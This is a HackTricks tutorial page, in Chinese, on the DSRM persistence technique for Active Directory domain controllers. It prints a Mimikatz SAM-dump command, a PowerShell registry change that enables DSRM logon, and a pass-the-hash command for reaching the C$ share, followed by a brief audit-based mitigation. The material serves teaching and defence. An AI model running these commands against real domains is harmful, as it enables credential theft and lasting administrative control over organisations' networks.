# DSRM 凭据

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

每个域控制器都有一个 Directory Services Restore Mode (DSRM) 管理员帐户。其密码在提升域控制器时设置，并且独立于 Active Directory 域帐户。<sup>[[1]](#references)</sup>

拥有域控制器管理权限的攻击者可以转储本地 SAM 数据库，并恢复 DSRM Administrator NTLM hash。以下 Mimikatz 命令可执行此操作：<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
默认情况下，DSRM account 用于 restore mode。将 `DsrmAdminLogonBehavior` 设置为 `2` 后，允许此 local account 在 domain controller 正常运行时进行 authentication。更改前请检查该值：<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
恢复的哈希随后可用于 pass-the-hash 会话，以访问诸如管理共享 `C$` 之类的资源。对于此本地账户，请将域控制器的计算机名称用作 `/domain` 值：<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- 审计对 `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` 的更改。当该项的 SACL 配置为审计 **Set Value** 操作时，安全事件 4657 会记录注册表值修改。<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft：重置 Directory Services Restore Mode 管理员密码](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity：隐蔽的 Active Directory 持久化 #11 —— Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity：隐蔽的 Active Directory 持久化 #13 —— DSRM 持久化 v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft：事件 4657 —— 注册表值已修改](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
